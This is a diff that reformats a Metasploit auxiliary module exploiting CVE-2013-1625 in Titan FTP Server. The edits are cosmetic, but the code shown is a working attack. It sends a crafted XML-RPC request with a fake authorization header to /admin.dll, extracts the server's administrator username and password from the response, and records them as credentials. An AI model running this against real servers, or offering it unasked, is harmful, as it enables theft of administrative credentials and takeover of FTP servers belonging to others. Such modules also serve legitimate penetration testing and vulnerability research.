@@ -12,7 +12,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Titan FTP Administrative Password Disclosure',
+      'Name' => 'Titan FTP Administrative Password Disclosure',
       'Description' => %q{
         On Titan FTP servers prior to version 9.14.1628, an attacker can
       retrieve the username and password for the administrative XML-RPC
@@ -24,15 +24,13 @@ class MetasploitModule < Msf::Auxiliary
       add and remove FTP users, as well as add, remove, and modify
       available directories and their permissions.
       },
-      'Author'      =>
-        [
-          'Spencer McIntyre'
-        ],
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
-          [ 'CVE', '2013-1625' ]
-        ]
+      'Author' => [
+        'Spencer McIntyre'
+      ],
+      'License' => MSF_LICENSE,
+      'References' => [
+        [ 'CVE', '2013-1625' ]
+      ]
     )
 
     register_options([Opt::RPORT(31001)])
@@ -41,16 +39,17 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     res = send_request_cgi(
       {
-        'uri'       => '/admin.dll',
-        'method'    => 'POST',
-        'headers'   => {
+        'uri' => '/admin.dll',
+        'method' => 'POST',
+        'headers' => {
           'SRT-WantXMLResponses' => 'true',
-          'SRT-XMLRequest'       => 'true',
-          'Authorization'        => 'Basic FAKEFAKE'
+          'SRT-XMLRequest' => 'true',
+          'Authorization' => 'Basic FAKEFAKE'
         },
-        'data'      => '<SRRequest><SRTarget>DOM</SRTarget><SRAction>GCFG</SRAction><SRServerName/><SRPayload></SRPayload></SRRequest>'
-      })
-    return if not res
+        'data' => '<SRRequest><SRTarget>DOM</SRTarget><SRAction>GCFG</SRAction><SRServerName/><SRPayload></SRPayload></SRRequest>'
+      }
+    )
+    return if !res
 
     if res.code == 400
       vprint_status("#{ip}:#{datastore['RPORT']} - Server Responeded 400, It's Likely Patched")
@@ -63,25 +62,25 @@ class MetasploitModule < Msf::Auxiliary
     xml_data = res.body.strip
     resp_root = REXML::Document.new(xml_data).root
 
-    srresponse = resp_root.elements.to_a("//SRResponse")[0]
-    srdomainparams = srresponse.elements.to_a("//SRDomainParams")[0]
+    srresponse = resp_root.elements.to_a('//SRResponse')[0]
+    srdomainparams = srresponse.elements.to_a('//SRDomainParams')[0]
 
     info = {}
     srdomainparams.elements.each do |node|
       case node.name
-        when "DomainName"
-          info[:domain] = Rex::Text.uri_decode(node.text)
-        when "BaseDataDir"
-          info[:basedir] = Rex::Text.uri_decode(node.text)
-        when "CreationDate"
-          info[:username] = Rex::Text.uri_decode(node.text)
-        when "CreationTime"
-          info[:password] = Rex::Text.uri_decode(node.text)
+      when 'DomainName'
+        info[:domain] = Rex::Text.uri_decode(node.text)
+      when 'BaseDataDir'
+        info[:basedir] = Rex::Text.uri_decode(node.text)
+      when 'CreationDate'
+        info[:username] = Rex::Text.uri_decode(node.text)
+      when 'CreationTime'
+        info[:password] = Rex::Text.uri_decode(node.text)
       end
     end
 
-    if (info[:username] and info[:password])
-      if (info[:domain] and info[:basedir])
+    if (info[:username] && info[:password])
+      if (info[:domain] && info[:basedir])
         print_good("#{ip}:#{datastore['RPORT']} - Domain: #{info[:domain]}")
         print_good("#{ip}:#{datastore['RPORT']} - Base Directory: #{info[:basedir]}")
       end
@@ -115,7 +114,7 @@ class MetasploitModule < Msf::Auxiliary
 
     login_data = {
       core: create_credential(credential_data),
-      status: Metasploit::Model::Login::Status::UNTRIED,
+      status: Metasploit::Model::Login::Status::UNTRIED
     }.merge(service_data)
 
     create_credential_login(login_data)
